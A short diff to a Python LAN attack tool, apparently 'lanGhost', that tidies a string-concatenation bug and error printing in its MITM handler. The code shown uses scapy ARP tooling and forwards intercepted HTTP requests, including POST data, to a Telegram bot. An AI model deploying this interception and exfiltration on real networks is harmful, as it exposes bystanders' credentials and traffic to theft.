@@ -12,7 +12,6 @@ from scapy.all import send, ARP
 from time import sleep
 import netifaces
 import threading
-import traceback
 import telegram
 import requests
 import sqlite3
@@ -210,9 +209,9 @@ def mitmHandler(target, ID, bot):
                         break
                     else:
                         if item[4] == "POST":
-                            textline += + str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + str(item[5]) + "\n\n"
+                            textline += str(item[4]) + " ➖ " + str(item[3]) + "\n📄 POST DATA:\n" + str(item[5]) + "\n\n"
                         else:
-                            textline += + str(item[4]) + " ➖ " + str(item[3]) + "\n\n"
+                            textline += str(item[4]) + " ➖ " + str(item[3]) + "\n\n"
                     DBcursor.execute("DELETE FROM lanGhost_mitm WHERE id=" + str(item[0]))
                     DBconn.commit()
                 if not textline == "📱 MITM - " + target[0] + "\n\n":
@@ -220,7 +219,7 @@ def mitmHandler(target, ID, bot):
                 DBconn.close()
                 time.sleep(1)
             except:
-                print("[!] " + str(traceback.format_exc()))
+                print("[!!!] mitmHandler crashed...")
         else:
             print("[+][mitmHandler][ID:" + str(ID) + "] Stopping mitmdump...")
             os.system("sudo screen -S lanGhost-mitm-" + str(ID) + " -X stuff '^C\n'")
